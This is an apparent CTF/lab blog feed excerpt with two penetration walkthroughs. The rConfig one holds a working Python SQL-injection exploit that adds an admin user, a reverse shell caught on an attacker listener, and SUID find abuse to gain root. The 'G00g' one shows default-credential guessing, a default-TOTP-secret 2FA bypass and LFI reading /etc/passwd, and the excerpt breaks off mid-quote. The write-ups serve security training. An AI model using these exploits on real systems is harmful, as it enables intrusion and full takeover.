&lt;div class=&quot;language-py highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/python3
&lt;/span&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;requests&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;sys&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;urllib.parse&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;string&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;random&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;requests.packages.urllib3.exceptions&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;InsecureRequestWarning&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;packages&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;urllib3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;disable_warnings&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;InsecureRequestWarning&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;requests.exceptions&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Timeout&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;[+] Usage : ./rconfig_exploit.py https://target&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;target&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;vuln_page&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/commands.inc.php&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;vuln_parameters&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;?searchOption=contains&amp;amp;searchField=vuln&amp;amp;search=search&amp;amp;searchColumn=command&quot;&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;[+] Adding a temporary admin user...&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;fake_id&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;random&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;randint&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;200&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;900&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;fake_user&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;attacker&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;fake_pass_md5&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;21232f297a57a5a743894a0e4a801fc3&quot;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# hash of &apos;admin&apos;
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fake_userid_md5&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;6c97424dc92f14ae78f8cc13cd08308d&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;addUserPayload&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%20;INSERT%20INTO%20`users`%20(`id`,%20`username`,%20`password`,%20`userid`,%20`userlevel`,%20`email`,%20`timestamp`,%20`status`)%20VALUES%20(&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fake_id&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;,%20&apos;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fake_user&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&apos;,%20&apos;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fake_pass_md5&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&apos;,%20&apos;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fake_userid_md5&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&apos;,%209,%20&apos;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fake_user&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;@domain.com&apos;,%201346920339,%201);--&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;encoded_request&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;target&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;vuln_page&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;vuln_parameters&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;addUserPayload&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;firstrequest&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;exploit_req&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;firstrequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;encoded_request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;verify&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;False&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;request&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;login_info&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&quot;user&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fake_user&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&quot;pass&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;admin&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&quot;sublogin&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;[+] Authenticating as: &quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fake_user&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;:admin ...&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;[+] Done.&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;After executing the above script, we should be able to login with the credentials: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;attacker:admin&lt;/code&gt;. Now that we have the valid credentials, we can procure a reverse shell using the first script.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# python3 48241.py https://192.168.78.57:8081 attacker admin 192.168.49.78 80&lt;/span&gt;
...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Our listener caught the revere shell at port 80 as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;apache&lt;/code&gt; user.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# nc -nlvp 80                                                                                                                                                                           2 ⚙ &lt;/span&gt;
listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 80 ...                                                                                                                                                                     
connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;192.168.49.78] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;192.168.78.57] 56142
bash: no job control &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;this shell
bash-4.2&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;whoami
whoami
&lt;/span&gt;apache
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;privilege-escalation&quot;&gt;&lt;strong&gt;Privilege Escalation&lt;/strong&gt;&lt;/h1&gt;

&lt;h4 id=&quot;suid&quot;&gt;&lt;strong&gt;SUID&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;Locally enumerate the target reveals us a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/bin/find&lt;/code&gt; SUID binary.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bash-4.2&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;find / &lt;span class=&quot;nt&quot;&gt;-perm&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-4000&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-ls&lt;/span&gt; 2&amp;gt;/dev/null
12596477  196 &lt;span class=&quot;nt&quot;&gt;-rwsr-xr-x&lt;/span&gt;   1 root     root       199304 Oct 30  2018 /usr/bin/find
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;...]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;suid-abuse&quot;&gt;&lt;strong&gt;SUID Abuse&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;Leverage the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;find&lt;/code&gt; SUID binary, we can easily acquire &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt; shell.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bash-4.2&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;find &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-exec&lt;/span&gt; /bin/bash &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\;&lt;/span&gt;
bash-4.2# &lt;span class=&quot;nb&quot;&gt;whoami
&lt;/span&gt;root
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name></name></author><category term="pg" /><category term="ctf" /><category term="linux" /><summary type="html">Summary Of Result We gain initial foothold by exploiting the vulnerable version of rConfig - Configuration Management application. We will then escalate our privilege via a misconfigred SUID binary.</summary></entry><entry><title type="html">G00g - OSPG</title><link href="https://jayngng.github.io/blog/g00g-ospg/" rel="alternate" type="text/html" title="G00g - OSPG" /><published>2021-08-14T18:42:52+10:00</published><updated>2021-08-14T18:42:52+10:00</updated><id>https://jayngng.github.io/blog/g00g---ospg</id><content type="html" xml:base="https://jayngng.github.io/blog/g00g-ospg/">&lt;h1 id=&quot;summary-ofresult&quot;&gt;&lt;strong&gt;Summary of Result&lt;/strong&gt;&lt;/h1&gt;

&lt;p&gt;In this walkthrough, we will exploit the target system by guessing weak credentials in the admin login web portal and bypassing two-factor authentication (2FA) with a default secret key. After that. the website introduces us to another vulnerability, Local File Inclusion (LFI). Abusing LFI to read system user, his password hash, and a 2FA secret key. Exploit the hash and the secret key to acquire initial access.&lt;/p&gt;

&lt;p&gt;Locally enumerating divulges a misconfigured SUID binary. Taking advantage of the binary, we are able to escalate our privilege to the root level.&lt;/p&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;attack-narrative&quot;&gt;&lt;strong&gt;Attack Narrative&lt;/strong&gt;&lt;/h1&gt;

&lt;p&gt;The attack will be generally split into three major categories:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Enumeration&lt;/li&gt;
  &lt;li&gt;Exploitation&lt;/li&gt;
  &lt;li&gt;Administrative Privilege Escalation&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;enumeration&quot;&gt;&lt;strong&gt;Enumeration&lt;/strong&gt;&lt;/h1&gt;

&lt;h4 id=&quot;nmap&quot;&gt;Nmap&lt;/h4&gt;

&lt;p&gt;We will start with a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt; scan.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-T4&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; 192.168.113.144
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Starting Nmap 7.80 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2021-07-23 06:02 AEST
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
80/tcp open  http    Apache httpd 2.4.38
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;Two services are opening on the target system: &lt;strong&gt;SSH&lt;/strong&gt; and &lt;strong&gt;HTTP&lt;/strong&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;web-enumeration&quot;&gt;Web Enumeration&lt;/h4&gt;

&lt;p&gt;Let’s have a look at the web application → We are instantly blocked by the authentication protocol.&lt;/p&gt;

&lt;p&gt;All we can do now is to try some common credentials: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin:admin&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin:password&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root:root&lt;/code&gt;, and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root:toor&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;→ The first one (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin:admin&lt;/code&gt;) works perfectly and let us bypass the authentication portal.&lt;/p&gt;

&lt;p&gt;Now, we are dealing with 2FA authentication prompt.&lt;/p&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/goog/2fa.png&quot; title=&quot;goog/2fa.png&quot; alt=&quot;goog/2fa.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;Up to this point, we need to find a valid OTP token in order to bypass the 2FA. Otherwise, this is a dead end …
Lucky for us, developers left a interesting in the page source.&lt;/p&gt;

&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[...]
&lt;span class=&quot;c&quot;&gt;&amp;lt;!-- itemir/apache_2fa --&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;With a few researches, we found that the web server implements &lt;strong&gt;Apache Two-Factor (2FA) Authentication&lt;/strong&gt; with &lt;strong&gt;Google Authenticator&lt;/strong&gt; (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;apache_2fa&lt;/code&gt; by &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;itemir&lt;/code&gt;), which can be found &lt;a href=&quot;https://github.com/itemir/apache_2fa&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Spending some time to read and comprehend its function.&lt;/p&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;exploitation&quot;&gt;&lt;strong&gt;Exploitation&lt;/strong&gt;&lt;/h1&gt;
&lt;p&gt;At this point, we need to know that a secret key will give us the right permission to generate a valid OTP token.&lt;/p&gt;

&lt;h4 id=&quot;default-2fa-secretkey&quot;&gt;Default 2FA secret key&lt;/h4&gt;
&lt;p&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;README.md&lt;/code&gt; file clearly demonstrates on how to use the tool.&lt;/p&gt;

&lt;div class=&quot;language-md highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;...
&lt;span class=&quot;gs&quot;&gt;**In order to obtain Authentication Token, download Google Authenticator for iOS or Android and create a profile by using ND4LKCSFMUQISO6CBZQATLDP  secret key**&lt;/span&gt; (there are many other applications that provide the same  capability with additional features, you can basically use any  application that supports TOTP). Once you define a profile, Google  Authenticator will create a token that you can use in this form.
If the test is successful, edit apache_credentials and tokens.json files and remove test_user
...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;As we can see, there is a &lt;strong&gt;default&lt;/strong&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;test_user&lt;/code&gt; user and a &lt;strong&gt;default&lt;/strong&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;secret&lt;/code&gt; key,&lt;/p&gt;

&lt;div class=&quot;language-md highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ND4LKCSFMUQISO6CBZQATLDP
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;which is &lt;strong&gt;only used to test functions, after the test, delvelopers need to remove them&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;Now, let us check if the developers make a critical mistake by using default secret key.&lt;/p&gt;

&lt;p&gt;In order to set up OTP, try the followings:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Download Google Authenticator app.&lt;/li&gt;
  &lt;li&gt;Create a new profile.&lt;/li&gt;
  &lt;li&gt;Copy and paste the above secret key.&lt;/li&gt;
  &lt;li&gt;Click Save/Done.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;After setup is done, we should now have a 6-digit OTP password generated randomly every 30 seconds. To test our theory, we copy and paste the token into the prompt.&lt;/p&gt;

&lt;p&gt;It acutally works! As we can see, we are successfully bypass the 2FA because the developers indeed forgot to change the secret key!.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;lfi-enumeration&quot;&gt;LFI Enumeration&lt;/h4&gt;

&lt;p&gt;Now, we are logged in, there is drop down menu with three functions &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ps aux&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;w&lt;/code&gt;, and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;uptime&lt;/code&gt;. Poking around these functions, clicking “&lt;strong&gt;Run&lt;/strong&gt;” → “&lt;strong&gt;View Result&lt;/strong&gt;” will redirects us to a new page &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/spool/viewresult.php?view=[NAME].txt&lt;/code&gt; … this yields an output of the previous functions.&lt;/p&gt;

&lt;p&gt;As the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;viewresult.php&lt;/code&gt; seems to be vulnerable to LFI, let us try fetching the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/passwd&lt;/code&gt; file.&lt;/p&gt;

&lt;div class=&quot;language-md highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://192.168.113.144/spool/viewresult.php?view=/etc/passwd

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin

[...]

Debian-exim:x:106:113::/var/spool/exim4:/usr/sbin/nologin
&lt;span class=&quot;gs&quot;&gt;**fox:x:1000:1000::/home/fox:/bin/sh**&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The output reveals a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fox&lt;/code&gt; user on this system.&lt;/p&gt;

&lt;h4 id=&quot;fail2ban&quot;&gt;Fail2ban&lt;/h4&gt;

&lt;p&gt;As we try to brute force SSH password of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fox&lt;/code&gt; user, we’ll notice that the server implements a security control that blocks any IP address failed to provide a correct password for couple minutes.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;First three failed attempts.&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ssh fox@192.168.113.144
Password: 
Password: 
Password: 
fox@192.168.113.144&lt;span class=&quot;s1&quot;&gt;&apos;s password: 
^C
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;Then login again.&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ssh fox@192.168.113.144
ssh: connect to host 192.168.113.144 port 22: Connection refused
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This happened because the server carries out a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fail2ban&lt;/code&gt; service, it is commonly used to mitigate bruteforcing attack against SSH protocol.&lt;/p&gt;

&lt;p&gt;We can confirm this by looking at the result of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ps aux&lt;/code&gt; function in the admin web portal.&lt;/p&gt;

&lt;div class=&quot;language-md highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;...
root       413  0.0  0.5  48228 10576 ?        Ss   15:23   0:00 ...
root       426  0.0  0.3  19308  6424 ?        Ss   15:23   0:00 /lib/systemd/systemd-logind
&lt;span class=&quot;gs&quot;&gt;**root       433  0.0  1.0 250340 20532 ?        Ssl  15:23   0:02 /usr/bin/python3 /usr/bin/fail2ban-server -xf start**&lt;/span&gt;
root       448  0.0  0.0   5612  1744 tty1     Ss+  15:23   0:00 /sbin/agetty -o -p -- &lt;span class=&quot;se&quot;&gt;\u&lt;/span&gt; --noclear tty1 linux
...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Back to the 2FA. In the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;README.md&lt;/code&gt; file of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;itemir/apache_2fa&lt;/code&gt;, he also states:&lt;/p&gt;

&lt;div class=&quot;language-md highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;...
